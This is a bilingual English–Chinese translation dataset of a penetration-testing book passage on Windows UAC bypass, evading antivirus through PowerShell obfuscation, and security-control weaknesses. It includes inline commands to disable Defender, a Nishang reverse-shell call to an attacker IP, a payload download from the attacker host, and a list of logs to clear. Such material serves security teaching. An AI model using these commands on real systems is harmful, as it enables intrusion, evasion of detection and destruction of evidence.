- en: '![Graphical user interface, text, application, chat or text message  Description
    automatically generated](../Images/B17765_09_24.png)'
  id: totrans-193
  prefs: []
  type: TYPE_IMG
  zh: '![图形用户界面，文本，应用程序，聊天或文本消息 说明自动生成](../Images/B17765_09_24.png)'
- en: 'Figure 9.24: A popup that the victim will receive when exploit/windows/local/ask
    is run'
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 图9.24：受害者在运行 exploit/windows/local/ask 时将收到的弹出窗口
- en: If the system’s current user is in an administrator’s group, and if the UAC
    is set to the default **Notify me only when programs try to make changes to my
    computer** (it will not work if set to **Always Notify**), an attacker will be
    able to use the Metasploit `exploit/windows/local/bypassuac` module to elevate
    their privileges.
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 如果系统当前用户属于管理员组，并且UAC设置为默认的**仅当程序尝试对我的计算机进行更改时通知我**（如果设置为**始终通知**，则无法绕过），攻击者将能够使用Metasploit的`exploit/windows/local/bypassuac`模块提升其权限。
- en: To ensure that you can control the remote machine completely, we must be able
    to obtain administrative-level access. Attackers typically utilize `getsystem`
    to escalate their current capability to system privileges.
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 为了确保完全控制远程计算机，我们必须能够获得管理员级别的访问权限。攻击者通常使用`getsystem`来提升当前权限到系统权限。
- en: '![](../Images/B17765_09_25.png)'
  id: totrans-197
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_09_25.png)'
- en: 'Figure 9.25: Limited shell in Metasploit'
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 图9.25：Metasploit中的有限Shell
- en: 'The `ask` module creates multiple artifacts on the target system and can be
    recognized by most antivirus software. Note that this will only work when the
    user is a local administrator. Let’s now use the Windows local exploit to bypass
    the UAC. Once `SESSION` is set to an active session, attackers will now be able
    to bypass the UAC set by the Windows operating system and a successful bypass
    will provide attackers with another Meterpreter session with system-level privileges,
    as shown in *Figure 9.26*:'
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: '`ask`模块会在目标系统上创建多个伪迹，并且大多数杀毒软件可以识别这些伪迹。请注意，这只有在用户是本地管理员时才有效。现在，让我们使用Windows本地漏洞绕过UAC。一旦`SESSION`设置为活动会话，攻击者将能够绕过Windows操作系统设置的UAC，成功绕过后，攻击者将获得另一个具有系统级权限的Meterpreter会话，如*图9.26*所示：'
- en: '![Text  Description automatically generated](../Images/B17765_09_26.png)'
  id: totrans-200
  prefs: []
  type: TYPE_IMG
  zh: '![文本 说明自动生成](../Images/B17765_09_26.png)'
- en: 'Figure 9.26: Escalating the privilege using exploit/windows/local/ask via Metasploit'
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: 图9.26：通过Metasploit使用exploit/windows/local/ask提升权限
- en: Using fodhelper to bypass UAC in Windows 10
  id: totrans-202
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用fodhelper绕过Windows 10中的UAC
- en: '`fodhelper.exe` is the executable used by Windows to manage features in Windows
    settings. If the attackers have limited shell or normal user access to the victim
    system, they can make use of `fodhelper.exe` to bypass the UAC.'
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: '`fodhelper.exe`是Windows用于管理Windows设置中功能的可执行文件。如果攻击者对受害者系统有有限的Shell或普通用户访问权限，他们可以利用`fodhelper.exe`来绕过UAC。'
- en: Testers have to note whether Microsoft Defender real-time monitoring is disabled,
    as this path might be blocked by the defender as a UAC bypass. It is recommended
    to disable Microsoft Defender by running `PowerShell.exe Set-MpPreference –DisableRealtimeMonitoring
    $true` from the command line as an administrator.
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 测试人员必须注意微软防御者实时监控是否已禁用，因为此路径可能会被防御者阻止作为UAC绕过。建议通过以管理员身份运行`PowerShell.exe Set-MpPreference
    –DisableRealtimeMonitoring $true`命令来禁用微软防御者。
- en: 'Bypassing the UAC can be achieved by running the following commands in Windows
    PowerShell that take advantage of a trusted binary in Windows operating systems,
    which allows elevation without requiring a UAC prompt with most UAC settings.
    The binary checks for a specific registry key and executes the instruction:'
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: 绕过UAC可以通过在Windows PowerShell中运行以下命令来实现，这些命令利用了Windows操作系统中的受信任二进制文件，该二进制文件允许在大多数UAC设置下提升权限，而无需UAC提示。该二进制文件会检查特定的注册表键并执行指令：
- en: '[PRE6]'
  id: totrans-206
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: '`![Background pattern  Description automatically generated](../Images/B17765_09_27.png)`'
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: '`![背景图案 说明自动生成](../Images/B17765_09_27.png)`'
- en: 'Figure 9.27: Manual fodhelper UAC bypass'
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 图9.27：手动fodhelper UAC绕过
- en: 'Or, this can be achieved by running a single-line PowerShell script. While
    the HTTP web server is hosted by the attackers, this can be achieved with the
    following:'
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 或者，这可以通过运行一行PowerShell脚本来实现。在攻击者托管的HTTP Web服务器的帮助下，可以通过以下方式实现：
- en: Download the bypass script ([https://github.com/PacktPublishing/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-4E/blob/main/Chapter%2009/FodHelperBypassUAC.ps1](https://github.com/PacktPublishing/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-4E/blob/main/Chapter%2009/FodHelperBypassUAC.ps1))
  id: totrans-210
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下载绕过脚本（[https://github.com/PacktPublishing/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-4E/blob/main/Chapter%2009/FodHelperBypassUAC.ps1](https://github.com/PacktPublishing/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-4E/blob/main/Chapter%2009/FodHelperBypassUAC.ps1)）
- en: Start the `apache2` service in Kali Linux by running `sudo service apache2 start`
  id: totrans-211
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过运行 `sudo service apache2 start` 在 Kali Linux 上启动 `apache2` 服务
- en: 'Copy the exploit to the relevant HTML folder, `cp FodhelperBypass.ps1 /var/www/html/anyfolder/`,
    and then use it using the following command:'
  id: totrans-212
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将漏洞利用文件复制到相关的 HTML 文件夹，`cp FodhelperBypass.ps1 /var/www/html/anyfolder/`，然后使用以下命令运行：
- en: '[PRE7]'
  id: totrans-213
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE7]'
- en: The preceding script will open a new shell to Empire PowerShell with high privileges.
    We will explore using PowerShell Empire in detail in *Chapter 10*, *Exploitation*.
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: 上述脚本将打开一个新的 Empire PowerShell shell，并以高权限运行。我们将在 *第 10 章*，*利用* 中详细探讨如何使用 PowerShell
    Empire。
- en: Using Disk Cleanup to bypass UAC in Windows 10
  id: totrans-215
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用磁盘清理绕过 Windows 10 中的 UAC
- en: This attack method involves Disk Cleanup, the Windows utility designed to free
    up space on the hard drive. Default scheduled tasks on Windows 10 revealed a task
    named SilentCleanup, which executes the Disk Cleanup process, `cleanmgr.exe`,
    with the highest privileges, even if executed by an unprivileged user. The process
    creates a new folder named `GUID` in the `Temp` directory and copies an executable
    and various DLLs into it.
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
  zh: 这种攻击方法涉及磁盘清理，这是 Windows 中的一个工具，旨在释放硬盘空间。Windows 10 上的默认计划任务揭示了一个名为 SilentCleanup
    的任务，它以最高权限执行磁盘清理过程 `cleanmgr.exe`，即使是由无权限用户执行也会如此。该过程会在 `Temp` 目录中创建一个名为 `GUID`
    的新文件夹，并将一个可执行文件和多个 DLL 文件复制到其中。
- en: 'The executable is then launched, and it starts loading the DLLs in a certain
    order, as shown in *Figure 9.28*:'
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: 然后启动可执行文件，它会按特定顺序加载 DLL 文件，如 *图 9.28* 所示：
- en: '[PRE8]'
  id: totrans-218
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: '![](../Images/B17765_09_28.png)'
  id: totrans-219
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_09_28.png)'
- en: 'Figure 9.28: Escalating privileges using the DiskCleanUP vulnerability'
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.28：利用 DiskCleanUP 漏洞提升权限
- en: Although Microsoft Defender offers real-time monitoring, this exploit might
    work while running multiple times on the device.
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: 尽管 Microsoft Defender 提供了实时监控，但该漏洞利用可能在设备上多次运行时仍然有效。
- en: Obfuscating the PowerShell and using fileless techniques
  id: totrans-222
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 混淆 PowerShell 并使用无文件技术
- en: Recent improvements in the endpoint security defense mechanisms and real-time
    monitoring using the EDR have placed lots of limitations on the existing attacking
    tools. However, there are always new ways to bypass them. In this section, we
    will explore how to obfuscate a known PowerShell payload and get a remote shell
    to the attacker.
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: 近期端点安全防御机制和基于 EDR 的实时监控对现有攻击工具造成了很多限制。然而，总是有新的方法可以绕过它们。在本节中，我们将探讨如何混淆一个已知的 PowerShell
    有效载荷，并获取一个远程 shell 给攻击者。
- en: 'We will leverage the `PyFuscation` tool. This is written in Python 3 and has
    the ability to replace all the function names, variables, and parameters of a
    given PowerShell script. This can be cloned directly from the Git repository by
    running the following command:'
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将利用`PyFuscation`工具。这个工具是用 Python 3 编写的，能够替换给定 PowerShell 脚本中的所有函数名、变量和参数。可以通过运行以下命令从
    Git 仓库直接克隆：
- en: '[PRE9]'
  id: totrans-225
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: 'This should have the obfuscator ready to use. Now we will utilize the Nishang
    PowerShell script to obfuscate the payload. These scripts can be cloned from the
    Git repository by running `sudo git clone https://github.com/samratashok/nishang`
    and, from the same folder, `cd nishang/Shells`, add `Invoke-PowerShellTcp –Reverse
    –IPAddress <yourKaliIP> -Port 443` to the `Invoke-PowerShellTcp.ps1` script contents
    and save the file (this file is located in the `nishang/shells` folder). An edited
    snippet of the code is shown in *Figure 9.29*:'
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: 这样就准备好混淆器了。接下来，我们将使用 Nishang PowerShell 脚本来混淆有效载荷。可以通过运行 `sudo git clone https://github.com/samratashok/nishang`
    从 Git 仓库克隆这些脚本，然后从相同的文件夹中，`cd nishang/Shells`，将 `Invoke-PowerShellTcp –Reverse
    –IPAddress <yourKaliIP> -Port 443` 添加到 `Invoke-PowerShellTcp.ps1` 脚本内容中并保存文件（该文件位于
    `nishang/shells` 文件夹中）。编辑后的代码片段如 *图 9.29* 所示：
- en: '![](../Images/B17765_09_29.png)'
  id: totrans-227
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_09_29.png)'
- en: 'Figure 9.29: Editing the Invoke-PowerShellTcp.Ps1 contents'
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.29：编辑 Invoke-PowerShellTcp.Ps1 内容
- en: 'Finally, we will obfuscate the PowerShell script that we just edited with PyFuscation
    by running `sudo python3 PyFuscation.py –fvp –-ps nameofthescript.ps1`. You should
    be able to see that the PowerShell scripts, functions, variables, and parameters
    have now been replaced with a new folder and a new filename, as seen in *Figure
    9.30*:'
  id: totrans-229
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，我们将使用PyFuscation混淆我们刚刚编辑过的PowerShell脚本，通过运行`sudo python3 PyFuscation.py –fvp
    –-ps nameofthescript.ps1`。您应该能够看到，PowerShell脚本、函数、变量和参数已被替换为一个新的文件夹和新的文件名，如*图9.30*所示：
- en: '![](../Images/B17765_09_30.png)'
  id: totrans-230
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_09_30.png)'
- en: 'Figure 9.30: Running PyFuscation on Invoke-PowerShellTcp.ps1'
  id: totrans-231
  prefs: []
  type: TYPE_NORMAL
  zh: 图9.30：在Invoke-PowerShellTcp.ps1上运行PyFuscation
- en: 'Once the file is successfully obfuscated, we can change our directory to the
    output folder and then rename the file to something simpler to call from the target
    system, and we will host our web server using the Python module by simply running
    `python3 –m http.server`, as shown in *Figure 9.31*:'
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦文件成功混淆，我们可以更改目录到输出文件夹，然后将文件重命名为更简洁的名称以便从目标系统调用，接着我们将通过运行`python3 –m http.server`来托管我们的Web服务器，如*图9.31*所示：
- en: '![](../Images/B17765_09_31.png)'
  id: totrans-233
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_09_31.png)'
- en: 'Figure 9.31: Moving the file and hosting the Python web server'
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: 图9.31：移动文件并托管Python Web服务器
- en: On the target Windows machine, we can simply run `wget http://<yourkaliIP>/filename.ps1
    -Outfile anyfolder` from PowerShell.
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: 在目标Windows机器上，我们只需从PowerShell运行`wget http://<yourkaliIP>/filename.ps1 -Outfile
    anyfolder`。
- en: Now, the final script is ready to be scanned by the antivirus software. In this
    example, we will use Microsoft Defender to scan the script, as shown in *Figure
    9.32*. It should never find anything malicious in the script. To see the difference,
    you can first try with the original script without the obfuscation, where you
    will see an alert from Microsoft Defender, marking it as malicious and quarantining
    it.
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，最终脚本已经准备好接受杀毒软件扫描。在这个例子中，我们将使用微软Defender来扫描脚本，如*图9.32*所示。它应该不会找到任何恶意内容。为了查看差异，您可以先尝试使用未混淆的原始脚本，您将看到微软Defender的警报，标记其为恶意并将其隔离。
- en: '![](../Images/B17765_09_32.png)'
  id: totrans-237
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_09_32.png)'
- en: 'Figure 9.32: Microsoft Windows Defender confirmation that no new threats were
    found'
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: 图9.32：微软Windows Defender确认未发现新威胁
- en: 'As the last step, once the script is delivered to the target, attackers can
    now open the port for the target to connect to. In this case, port `443` was set
    in the initial payload. Once this PowerShell script is run, either by opening
    it in PowerShell or by running it, it should open up a direct reverse shell to
    the attackers without any antivirus/EDR blocking it, as shown in *Figure 9.33*:'
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: 最后一步，一旦脚本被传送到目标，攻击者现在可以为目标打开端口进行连接。在这种情况下，端口`443`是在最初的有效负载中设置的。一旦运行此PowerShell脚本，无论是通过PowerShell打开它还是直接运行，它都应当打开一个直接的反向Shell，连接到攻击者的系统，且不会被任何杀毒软件/EDR拦截，如*图9.33*所示：
- en: '![](../Images/B18209_09_33.png)'
  id: totrans-240
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B18209_09_33.png)'
- en: 'Figure 9.33: Remote shell on an attacker’s Kali Linux on port 443'
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
  zh: 图9.33：攻击者的Kali Linux远程Shell，端口443
- en: We will explore all the different techniques of how to maintain command and
    control in *Chapter 13*, *Command and Control*.
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将在*第13章*《指挥与控制》中探讨如何保持指挥和控制的不同技巧。
- en: Other Windows-specific operating system controls
  id: totrans-243
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 其他Windows特定操作系统控制
- en: 'Windows-specific operating system controls can be further divided into the
    following five categories:'
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
  zh: Windows特定操作系统控制可进一步划分为以下五个类别：
- en: Access and authorization
  id: totrans-245
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 访问与授权
- en: Encryption
  id: totrans-246
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 加密
- en: System security
  id: totrans-247
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 系统安全
- en: Communications security
  id: totrans-248
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通信安全
- en: Auditing and logging
  id: totrans-249
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 审计与日志记录
- en: Access and authorization
  id: totrans-250
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 访问与授权
- en: 'The majority of the exploitations are performed on the access and authorization
    section of the security controls to gain access to the system and perform unauthorized
    activities. Some of the specific controls are as follows:'
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
  zh: 大多数漏洞利用都发生在安全控制的访问和授权部分，以获取系统访问权限并执行未经授权的活动。具体控制如下：
- en: Adding users to access Credential Manager, which will allow users to create
    applications as trusted callers. In return, this account can fetch the credentials
    of another user on the same system. An example would be where a user of the system
    adds their personal information to the **Generic Credentials** sections, as shown
    in *Figure 9.34*:![](../Images/B17765_09_34.png)
  id: totrans-252
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 将用户添加到凭证管理器中，使用户能够创建作为可信调用者的应用程序。作为回报，该帐户可以获取同一系统上另一个用户的凭证。举个例子，系统的用户将他们的个人信息添加到**通用凭证**部分，如*图9.34*所示：![](../Images/B17765_09_34.png)
- en: 'Figure 9.34: Microsoft Windows 10 Credential Manager'
  id: totrans-253
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 9.34：Microsoft Windows 10 凭证管理器
- en: Logging in through cloud-based accounts; by default, some Windows operating
    systems allow Microsoft accounts.
  id: totrans-254
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通过基于云的账户进行登录；默认情况下，一些Windows操作系统允许使用Microsoft账户。
- en: Don’t forget that guest accounts in legacy systems and locked accounts are used
    as service accounts to run scheduled jobs and other services.
  id: totrans-255
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 别忘了，旧系统中的来宾账户和被锁定的账户作为服务账户，用于运行计划任务和其他服务。
- en: Print driver installation can help to bypass the security controls set on the
    machine. Attackers can potentially replace the driver installation with a malicious
    executable to provide a persistent backdoor to the system.
  id: totrans-256
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 打印机驱动程序安装有助于绕过机器上设置的安全控制。攻击者可能会用恶意可执行文件替换驱动程序安装程序，从而为系统提供一个持久的后门。
- en: Anonymous **Security Identifier** (**SID**), named pipe, and enumeration of
    the SAM accounts are some of the controls that are applied to a system that is
    connected to the network either via domain or standalone security settings.
  id: totrans-257
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 匿名**安全标识符**（**SID**）、命名管道和SAM账户枚举是适用于通过域或独立安全设置连接到网络的系统的一些控制措施。
- en: Remotely accessing the registry paths and subpaths.
  id: totrans-258
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 远程访问注册表路径和子路径。
- en: Encryption
  id: totrans-259
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 加密
- en: Encryption techniques engaged by Microsoft Windows typically relate to password
    storage, NTLM sessions, and secure channel data.
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: Microsoft Windows采用的加密技术通常涉及密码存储、NTLM会话和安全通道数据。
- en: Attackers are mostly successful in bypassing encryption, either by utilizing
    weaker cipher suites or disabling the feature itself.
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者通常通过利用较弱的加密套件或直接禁用加密功能来成功绕过加密。
- en: System security
  id: totrans-262
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 系统安全
- en: 'System-level security revolves around the main local system-level exploitation
    and the controls that are in place to initiate a bypass:'
  id: totrans-263
  prefs: []
  type: TYPE_NORMAL
  zh: 系统级别的安全性主要围绕本地系统级别的利用和用于启动绕过的控制措施：
- en: 'Time zone synchronization: In most organizations, all the endpoints will sync
    their time with the primary domain; this provides the opportunity for an attacker
    to nullify evidence or track an exploit.'
  id: totrans-264
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 时区同步：在大多数组织中，所有终端会与主域同步时间；这为攻击者提供了伪造证据或跟踪漏洞利用的机会。
- en: Page file creation, locking pages in the memory, and creating token objects
    –some of the token objects and page files run at a system level. One such classic
    attack is a hibernation file attack.
  id: totrans-265
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 创建页面文件、锁定内存中的页面，并创建令牌对象——其中一些令牌对象和页面文件在系统级别运行。一种典型的攻击方式是休眠文件攻击。
- en: One of the first things that penetration testers must consider when they gain
    access to a target system with local admin privileges is to authenticate themselves
    to the domain, escalate the privileges, and add a user to the domain who can create
    global objects and symbolic links, which will provide full access to the domain.
  id: totrans-266
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 渗透测试人员在获得目标系统的本地管理员权限后，必须考虑的首要事项之一是将自己身份验证到域中，提升权限，并向域中添加一个能够创建全局对象和符号链接的用户，这将提供对域的完全访问。
- en: Load and unload device drivers and set firmware environment values.
  id: totrans-267
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 加载和卸载设备驱动程序，并设置固件环境值。
- en: Automatic administrative logon enabled for all system users.
  id: totrans-268
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 启用所有系统用户的自动管理员登录。
- en: Communications security
  id: totrans-269
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 通信安全
- en: Typically, in communications security, the majority of the additional network
    devices are in place, but with respect to Windows digitally signed certificates
    and the **Service Principal Name** (**SPN**) server, target name validation is
    one of the notable things that penetration testers could utilize to develop a
    custom exploit. We will be exploring the exploitation of SPN in the next chapter.
  id: totrans-270
  prefs: []
  type: TYPE_NORMAL
  zh: 通常，在通信安全方面，大多数附加网络设备已经到位，但关于Windows数字签名证书和**服务主体名称**（**SPN**）服务器，目标名称验证是渗透测试人员可以利用的一个重要环节，用于开发自定义漏洞利用程序。我们将在下一章探讨SPN的漏洞利用。
- en: Auditing and logging
  id: totrans-271
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 审计和日志记录
- en: 'Most of the default configuration controls that Windows can potentially put
    in place involve enabling system logs. The following is the list of logs that
    can be enabled by any organization to utilize information during an incident/forensic
    analysis:'
  id: totrans-272
  prefs: []
  type: TYPE_NORMAL
  zh: Windows可能设置的默认配置控制大多涉及启用系统日志。以下是任何组织可以在事件/取证分析期间利用的信息日志列表：
- en: Credential validation
  id: totrans-273
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 凭证验证
- en: Computer account management
  id: totrans-274
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 计算机账户管理
- en: Distribution group management
  id: totrans-275
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 分发组管理
- en: Other account management level
  id: totrans-276
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 其他账户管理级别
- en: Security group management
  id: totrans-277
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 安全组管理
- en: User account management
  id: totrans-278
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 用户账户管理
- en: Process creation
  id: totrans-279
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 进程创建
- en: Directive service access and changes
  id: totrans-280
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 指令服务访问和更改
- en: Account lockout/logoff/logon/special logon
  id: totrans-281
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 帐户锁定/注销/登录/特殊登录
- en: Removable storage
  id: totrans-282
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 可移动存储
- en: Policy changes
  id: totrans-283
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 政策变化
- en: Security state changes
  id: totrans-284
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 安全状态变化
- en: This provides a clear view of what types of logs the penetration testers must
    consider clearing after the exploit phase in our cyber kill chain methodology.
  id: totrans-285
  prefs: []
  type: TYPE_NORMAL
  zh: 这提供了一个清晰的视角，展示了渗透测试人员在我们网络攻击链方法论的漏洞利用阶段之后，必须考虑清除的日志类型。
- en: Summary
  id: totrans-286
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we took a deep dive into a systematic process for overcoming
    security controls set by organizations as part of their internal protection. We
    focused on different types of NAC bypass mechanisms, how to establish a connection
    to the external world using tunneling and bypassing the firewalls, and also learned
    about every level of network, application, and operating system controls to ensure
    that our exploits can successfully reach the target system. Additionally, we reviewed
    how to bypass antivirus detection through PowerShell obfuscation using PyFuscation
    and explored the Veil-Evasion and Shellter frameworks to make file-based exploits.
    We also saw how different Windows operating system security controls such as UAC,
    application whitelisting, and other Active Directory-specific controls put in
    place can be easily circumvented using the Metasploit framework.
  id: totrans-287
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们深入探讨了克服组织为其内部保护设定的安全控制的系统化过程。我们重点讨论了不同类型的网络接入控制（NAC）绕过机制，如何使用隧道技术建立与外部世界的连接并绕过防火墙，还了解了网络、应用程序和操作系统各个层级的控制，确保我们的漏洞利用能够成功到达目标系统。此外，我们回顾了如何通过PowerShell混淆使用PyFuscation绕过杀毒软件检测，并探讨了Veil-Evasion和Shellter框架，用于制作基于文件的漏洞利用。我们还观察到，如何利用Metasploit框架轻松绕过Windows操作系统的安全控制，例如用户账户控制（UAC）、应用程序白名单和其他特定于Active
    Directory的控制。
- en: In the next chapter, we will examine various means of exploiting systems, including
    public exploits, exploit frameworks, such as the Metasploit framework, PowerShell
    Empire projects, and Windows-based exploits.
  id: totrans-288
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章中，我们将研究各种利用系统的手段，包括公开漏洞、漏洞利用框架，如Metasploit框架、PowerShell Empire项目和基于Windows的漏洞利用。
